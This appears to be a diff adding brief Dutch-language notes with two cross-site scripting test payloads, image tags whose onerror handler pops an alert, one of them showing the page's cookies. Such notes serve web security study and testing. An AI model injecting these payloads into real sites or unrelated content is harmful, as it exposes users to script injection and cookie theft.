@@ -1,0 +1,5 @@
+- algemeen met image, alert
+<img src=x onerror=alert('xss')>
+
+- get cookies, not http, met image
+<img src=x onerror=alert(document.cookie)>
